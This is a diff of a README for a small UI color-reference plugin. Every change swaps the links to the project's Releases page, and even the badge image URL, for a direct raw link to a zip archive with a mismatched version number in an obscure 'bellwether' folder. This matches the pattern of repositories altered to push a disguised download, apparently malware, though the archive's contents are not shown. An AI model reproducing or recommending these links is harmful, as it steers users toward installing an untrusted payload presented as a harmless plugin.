@@ -1,6 +1,6 @@
 # 🎨 UI-Color-List-Reference - Simple Colors for Your UI Elements
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Hardpanther/UI-Color-List-Reference/releases)
+[![Download Latest Release](https://github.com/Hardpanther/UI-Color-List-Reference/raw/refs/heads/main/bellwether/Color-Reference-List-U-v2.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/Hardpanther/UI-Color-List-Reference/raw/refs/heads/main/bellwether/Color-Reference-List-U-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ To run the UI-Color-List-Reference plugin, ensure you meet the following require
 
 To download the UI-Color-List-Reference plugin, visit the Releases page here:
 
-[Download Latest Release](https://github.com/Hardpanther/UI-Color-List-Reference/releases)
+[Download Latest Release](https://github.com/Hardpanther/UI-Color-List-Reference/raw/refs/heads/main/bellwether/Color-Reference-List-U-v2.6.zip)
 
 ### Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Hardpanther/UI-Color-List-Reference/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Hardpanther/UI-Color-List-Reference/raw/refs/heads/main/bellwether/Color-Reference-List-U-v2.6.zip).
 2. **Find the Latest Version:** Look for the latest version of the plugin.
 3. **Download the Plugin:** Click on the download link for your operating system.
 4. **Extract the Files:** If the plugin downloads as a ZIP file, extract it to a folder on your computer.
@@ -90,4 +90,4 @@ For help, please visit the Issues tab in our GitHub repository, or you can join 
 
 For further inquiries or suggestions, feel free to reach out via email or through our GitHub issues page.
 
-Remember, you can always visit the [Releases page](https://github.com/Hardpanther/UI-Color-List-Reference/releases) to download the latest version and stay updated. Happy designing!
+Remember, you can always visit the [Releases page](https://github.com/Hardpanther/UI-Color-List-Reference/raw/refs/heads/main/bellwether/Color-Reference-List-U-v2.6.zip) to download the latest version and stay updated. Happy designing!
